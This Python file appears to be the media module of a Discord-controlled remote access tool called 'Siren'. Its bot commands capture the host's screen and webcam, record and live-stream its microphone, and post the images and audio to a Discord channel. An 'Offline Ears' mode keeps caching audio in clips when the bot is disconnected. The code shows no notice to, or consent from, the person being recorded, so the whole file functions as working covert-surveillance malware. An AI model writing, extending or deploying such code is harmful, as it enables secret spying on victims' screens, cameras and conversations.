import os
import time
import cv2
import sounddevice as sd
import soundfile as sf
import discord
from discord.ext import commands
from datetime import datetime
import asyncio
import threading
import mss
import io
import wave
import numpy as np
from src.client.core.siren import SirenEngine

class Media(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.is_streaming_visuals = False
        self.is_streaming_audio = False
        self.voice_client = None
        self.siren = SirenEngine(bot)

    @commands.command(name="join", help="Make the bot join a voice channel for streaming.")
    async def join_voice(self, ctx, *, channel_name: str):
        channel = discord.utils.get(ctx.guild.voice_channels, name=channel_name)
        if not channel:
            await ctx.send(f"❌ Error: Voice channel '{channel_name}' not found.")
            return
        
        try:
            if self.voice_client:
                await self.voice_client.move_to(channel)
            else:
                self.voice_client = await channel.connect()
            await ctx.send(f"🎙️ Joined voice channel: `{channel_name}`")
        except Exception as e:
            await ctx.send(f"❌ Voice Error: {str(e)}")

    @commands.command(name="leave", help="Make the bot leave the voice channel.")
    async def leave_voice(self, ctx):
        if self.voice_client:
            await self.voice_client.disconnect()
            self.voice_client = None
            self.is_streaming_audio = False
            await ctx.send("🛑 Left voice channel.")
        else:
            await ctx.send("⚠️ Bot is not in a voice channel.")

    @commands.command(name="stream_audio", help="Stream live audio to the current voice channel.")
    async def stream_audio(self, ctx):
        if not self.voice_client:
            await ctx.send("❌ Error: Join a voice channel first using `$join`.")
            return
        
        if self.is_streaming_audio:
            await ctx.send("⚠️ Already streaming audio.")
            return

        self.is_streaming_audio = True
        await ctx.send("🎙️ Starting live audio stream...")

        try:
            # Simple PCMAudio stream
            # We use a custom AudioSource that reads from sounddevice
            class SirenAudioSource(discord.AudioSource):
                def __init__(self, sample_rate=48000):
                    self.sample_rate = sample_rate
                    self.stream = sd.InputStream(samplerate=sample_rate, channels=2, dtype='int16')
                    self.stream.start()

                def read(self):
                    # Discord expects 20ms of audio (48k * 0.02 = 960 samples)
                    data, _ = self.stream.read(960)
                    return data.tobytes()

                def cleanup(self):
                    self.stream.stop()
                    self.stream.close()

            source = SirenAudioSource()
            self.voice_client.play(source, after=lambda e: print(f'Stream ended: {e}') if e else None)
            
        except Exception as e:
            await ctx.send(f"❌ Audio Stream Error: {str(e)}")
            self.is_streaming_audio = False

    @commands.command(name="stop_audio", help="Stop live audio streaming.")
    async def stop_audio(self, ctx):
        if self.voice_client and self.voice_client.is_playing():
            self.voice_client.stop()
        self.is_streaming_audio = False
        await ctx.send("🛑 Audio stream stopped.")

    @commands.command(name="stream_visuals", help="Start high-frequency visual streaming.")
    async def stream_visuals(self, ctx, mode: str = "screen", interval: float = 2.0):
        if self.is_streaming_visuals:
            await ctx.send("⚠️ Already streaming visuals.")
            return

        self.is_streaming_visuals = True
        await ctx.send(f"🎬 Starting {mode} stream (every {interval}s)...")
        
        try:
            while self.is_streaming_visuals:
                if mode == "screen":
                    with mss.mss() as sct:
                        monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
                        screenshot = sct.grab(monitor)
                        img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
                        filename = "stream_frame.png"
                else: # cam mode
                    cam = cv2.VideoCapture(0)
                    ret, frame = cam.read()
                    cam.release()
                    if ret:
                        _, buffer = cv2.imencode('.jpg', frame)
                        img_bytes = buffer.tobytes()
                        filename = "stream_frame.jpg"
                    else:
                        break

                discord_file = discord.File(io.BytesIO(img_bytes), filename=filename)
                await ctx.send(file=discord_file, delete_after=interval + 1)
                await asyncio.sleep(interval)
        except Exception as e:
            await ctx.send(f"❌ Stream Error: {str(e)}")
            self.is_streaming_visuals = False

    @commands.command(name="stop_stream", help="Stop visual streaming.")
    async def stop_stream(self, ctx):
        self.is_streaming_visuals = False
        await ctx.send("🛑 Visual stream stopped.")

    @commands.command(name="camshot", help="Take a quick camera shot.")
    async def camshot(self, ctx):
        try:
            cam = cv2.VideoCapture(0)
            if not cam.isOpened():
                await ctx.send("❌ Error: No camera found or access denied.")
                return

            ret, frame = cam.read()
            cam.release()

            if ret:
                file_path = f"camshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                cv2.imwrite(file_path, frame)
                await ctx.send(f"📸 Camera shot:", file=discord.File(file_path))
                os.remove(file_path)
            else:
                await ctx.send("❌ Error: Could not read frame from camera.")
        except Exception as e:
            await ctx.send(f"❌ Camera Error: {str(e)}")

    @commands.command(name="audiorecord", help="Record audio (default 10s).")
    async def audiorecord(self, ctx, seconds: int = 10):
        if seconds > 60:
            await ctx.send("⚠️ Max audio duration is 60 seconds.")
            seconds = 60

        try:
            fs = 44100
            await ctx.send(f"🎙️ Recording {seconds}s audio...")
            
            # Record audio non-blocking
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1, dtype='float32')
            
            # Wait for recording asynchronously
            await asyncio.sleep(seconds)
            sd.stop()
            
            # Save to file
            file_path = f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
            # Convert to 16-bit PCM for broader compatibility
            sf.write(file_path, recording, fs)
            
            await ctx.send(f"🎙️ Audio record complete:", file=discord.File(file_path))
            os.remove(file_path)
        except Exception as e:
            await ctx.send(f"❌ Audio Error: {str(e)}")

    @commands.command(name="ears_start", help="Enable Offline Ears (cache audio when disconnected).")
    async def ears_on(self, ctx, chunk_size: int = 60):
        self.bot.loop.create_task(self.siren.start_offline_ears(chunk_size))
        await ctx.send(f"👂 **Offline Ears Enabled.** Bot will cache audio in {chunk_size}s clips when disconnected.")

    @commands.command(name="ears_stop", help="Disable Offline Ears.")
    async def ears_off(self, ctx):
        self.siren.stop_offline_ears()
        await ctx.send("👂 **Offline Ears Disabled.**")

async def setup(bot):
    await bot.add_cog(Media(bot))
